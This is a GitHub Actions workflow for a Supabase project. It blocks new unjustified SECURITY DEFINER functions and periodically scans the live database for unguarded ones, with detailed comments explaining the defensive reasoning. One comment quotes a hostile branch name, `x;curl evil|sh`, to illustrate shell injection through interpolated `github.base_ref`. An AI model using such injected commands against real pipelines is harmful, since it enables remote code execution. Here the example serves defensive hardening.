# A NEW SECURITY DEFINER FUNCTION MUST SAY WHY IT NEEDS TO BE ONE.
#
# SECURITY DEFINER runs with the DEFINER's privileges, so it is the one place in
# the schema where the caller's own RLS does not apply. That is often exactly
# right — an RLS helper called from a policy USING clause would be useless as
# INVOKER — and occasionally an IDOR waiting to be found. The difference is not
# visible from the signature; it has to be stated.
#
# The estate already decided how. Phase 2.1A/2.1B annotated every SECURITY
# DEFINER function with `@SD-JUSTIFICATION` / `@SD-CATEGORY` / `@SD-AUDIT`, and
# Phase 2.3 then revoked public EXECUTE on the categories that did not need it.
# See supabase/migrations/README.md.
#
# MEASURED 2026-08-26 against production:
#
#   SECURITY DEFINER executable by `authenticated` .... 137
#     …carrying @SD-JUSTIFICATION ...................... 62
#     …never justified ................................. 75
#   executable by `anon` .............................. 7   (all 7 unannotated)
#
# The 75 were added after Phase 2.1, when nothing asked them to justify
# themselves. This gate does not fix them. It stops them becoming 76 — the only
# move available when a backlog is larger than any single change should touch.
#
# Two of the scariest-looking names were checked before assuming the worst:
# `admin_revoke_user_sessions(p_user_id)` and `xero_lock_and_get_refresh_token`
# are NOT executable by `authenticated` or `anon` at all. A name is not a finding.
#
# WHY THE DIFF AND NOT A COUNT — a total measured across submodule trees moves
# whenever a gitlink advances, so a count-based gate blames a PR for changes it
# did not make. That was learned the expensive way on the regex ratchet earlier
# today, twice, before it was corrected to a diff.
name: SECURITY DEFINER must justify itself

on:
  # SCHEDULE, added 2026-08-27, and it is the whole point of this change.
  #
  # Until now this workflow ran on `pull_request` only. It self-tested the auditor
  # and checked WHAT THE PR ADDS — a diff-only check. It has never once looked at
  # the live database.
  #
  # A SECURITY DEFINER function can be created without any event in this repository:
  # through the Supabase dashboard, through MCP, or by a migration applied
  # out-of-band. The defect is born in the DATABASE, and no event trigger here can
  # observe it. Measured 2026-08-27: five functions granted to `authenticated`,
  # taking their subject as an unchecked argument — direct IDORs — had survived
  # months of green runs on this very workflow, because it was never asked.
  #
  # precedent__bsuite__20260802__a_gate_must_prove_it_executed, fifth shape:
  # "a state created in another repository can only be observed on a clock", and
  # a database is another repository for this purpose.
  #
  # :51 is offset from the history audit (:17), pg_cron health (:29) and the
  # policy-drift audit (:43) so the four never contend for the pooler.
  schedule:
    - cron: '51 */6 * * *'
  pull_request:
    branches: [main, development]
  workflow_dispatch:

jobs:
  justify:
    name: No new unjustified SECURITY DEFINER
    runs-on: ubuntu-latest
    steps:
      # No submodules: the diff is a parent-repo artefact and submodule content
      # cannot change what THIS diff added.
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - uses: actions/setup-node@v4
        with:
          node-version: '24'

      # Watched to catch a planted defect AND watched not to flag a correctly
      # justified one. Both, or it cannot tell found-nothing from checked-nothing.
      - name: Self-test the checker
        run: node scripts/__tests__/check-added-security-definer.test.mjs

      # The diff-gate above stops the backlog GROWING. This one classifies the
      # backlog that already exists, and its classifier is what a reviewer will
      # trust when it says a function is unguarded — so it is self-tested here
      # even though the live scan needs a database this job does not have.
      #
      # Its first live run produced two false positives, and both are now
      # regression cases in the self-test: a guard TWO calls away (one-hop
      # resolution reported it as a finding) and an RLS helper (which MUST be
      # DEFINER and MUST NOT check its caller).
      - name: Self-test the transitive guard auditor
        run: node scripts/audit-security-definer-guards.mjs --self-test

      # A scan with no rows must say so rather than print a zero that reads as
      # clean. Asserting it here means nobody has to trust that it does.
      - name: A scan with no input reports ABSENT, not clean
        shell: bash
        run: |
          out=$(printf '' | node scripts/audit-security-definer-guards.mjs)
          echo "$out"
          case "$out" in
            *"ABSENT result"*) echo "ok — empty input is reported as absent" ;;
            *) echo "::error::empty input did not report an absent result"; exit 1 ;;
          esac

      # PULL REQUESTS ONLY. `github.base_ref` is set on pull_request events and is
      # EMPTY on schedule and workflow_dispatch, so on a scheduled run this step ran
      #   git merge-base HEAD "origin/"
      # and died with `fatal: Not a valid object name origin/`, exit 128. Measured
      # 2026-08-28: 19 of 19 pull_request runs green, and the scheduled run failing
      # every time — a gate red for a reason that has nothing to do with what it
      # checks, which is how a gate stops being read.
      #
      # Only THIS step is gated, not the job. The self-tests above it prove the
      # checker can still fail, and that is worth running on a schedule; asking
      # "what does this PR add" when there is no PR is not.
      - name: Check what this PR adds
        if: github.event_name == 'pull_request'
        shell: bash
        # `github.base_ref` is a BRANCH NAME, and a branch name is attacker-supplied.
        # Interpolated with ${{ }} it is pasted into the shell before bash ever sees
        # it, so a branch called `x;curl evil|sh` executes. Passed through `env:` it
        # arrives as a plain variable and `"$BASE_REF"` is inert.
        #
        # Flagged by semgrep `run-shell-injection` (ERROR, baseline 0) on the first
        # version of this file. Its sibling regex-assertion-ratchet.yml had already
        # been fixed for exactly this — I wrote the same hole into a gate whose whole
        # purpose is to make dangerous things justify themselves.
        env:
          BASE_REF: ${{ github.base_ref }}
        run: |
          set -euo pipefail
          git fetch -q origin "$BASE_REF"
          base=$(git merge-base HEAD "origin/$BASE_REF")
          echo "diffing $base..HEAD over *.sql"
          if git diff --unified=3 "$base"..HEAD -- '*.sql' | grep -q .; then
            git diff --unified=3 "$base"..HEAD -- '*.sql' \
              | node scripts/check-added-security-definer.mjs
          else
            echo "this PR touches no SQL — nothing to check"
          fi

  live-definer-scan:
    name: Every live SECURITY DEFINER function is guarded
    # Only on the clock (or by hand). The PR job above answers "does this diff add
    # an unjustified one"; this answers "is the DATABASE clean right now", which is
    # a different question with a different failure mode and no event to hang off.
    if: github.event_name == 'schedule' || github.event_name == 'workflow_dispatch'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5

      - uses: actions/setup-node@v4
        with:
          node-version: '24'

      - name: Guard — require project ref
        env:
          SUPABASE_PROJECT_ID: ${{ vars.SUPABASE_PROJECT_ID }}
        run: |
          set -euo pipefail
          if [ -z "${SUPABASE_PROJECT_ID:-}" ]; then
            echo "::error::SUPABASE_PROJECT_ID is empty — refusing to report a false 'no unguarded functions'."
            exit 1
          fi

      - name: Install psql client
        run: |
          set -euo pipefail
          # GitHub's runner image ships a Microsoft apt repo this estate never reads. It
          # intermittently answers 403 / "no longer signed", and under `set -euo pipefail`
          # that makes `apt-get update` fatal. schema-lag died on exactly that at 21:26 on
          # 2026-08-27 while phantom-migrations, running the same install a minute earlier,
          # passed - so it presents as flake, not as a broken workflow, and gets re-run
          # rather than fixed. Dropping the lists removes the dependency instead.
          sudo rm -f /etc/apt/sources.list.d/*microsoft* /etc/apt/sources.list.d/*azure* || true
          sudo apt-get update
          sudo apt-get install -y postgresql-client
          psql --version

      - name: Resolve pooler host
        id: pooler
        env:
          PGPASSWORD: ${{ secrets.SUPABASE_DB_PASSWORD }}
          PROJECT_ID: ${{ vars.SUPABASE_PROJECT_ID }}
        run: |
          set -euo pipefail
          for CLUSTER in aws-1 aws-0; do
            HOST="${CLUSTER}-us-east-1.pooler.supabase.com"
            if psql "postgresql://postgres.${PROJECT_ID}:${PGPASSWORD}@${HOST}:5432/postgres" \
                 -c "SELECT 1" >/dev/null 2>&1; then
              echo "db_host=$HOST" >> "$GITHUB_OUTPUT"
              echo "Pooler host: $HOST"
              exit 0
            fi
          done
          echo "::error::No pooler cluster accepted the connection — refusing to report a false clean scan."
          exit 1

      # BEFORE the scan, deliberately. A clean scan from a broken classifier is
      # indistinguishable from a clean scan of a healthy database, and this
      # classifier was demonstrably broken until 2026-08-27: it read a function's
      # own NAME as proof the function checked its caller, counted `auth.uid()`
      # appearing in an argument DEFAULT, matched guard tokens in COMMENTS, and
      # let a stale @SD-JUSTIFICATION short-circuit the whole verdict.
      - name: Self-test the classifier — prove it can still fail
        run: node scripts/audit-security-definer-guards.mjs --self-test

      - name: Scan every live SECURITY DEFINER function reachable by anon or authenticated
        env:
          PGPASSWORD: ${{ secrets.SUPABASE_DB_PASSWORD }}
          PROJECT_ID: ${{ vars.SUPABASE_PROJECT_ID }}
          DB_HOST: ${{ steps.pooler.outputs.db_host }}
        run: |
          set -euo pipefail
          DB_URL="postgresql://postgres.${PROJECT_ID}:${PGPASSWORD}@${DB_HOST}:5432/postgres"
          node scripts/audit-security-definer-guards.mjs --print-query > /tmp/sd.sql
          psql "$DB_URL" -v ON_ERROR_STOP=1 -tA -f /tmp/sd.sql > /tmp/sd.json
          # An EMPTY result is ABSENT, not clean — the checker exits 0 and says so on
          # no stdin, which would read as a pass. Refuse it here.
          test -s /tmp/sd.json || { echo "::error::the query returned nothing — that is an ABSENT result, not a clean one."; exit 1; }
          node scripts/audit-security-definer-guards.mjs < /tmp/sd.json
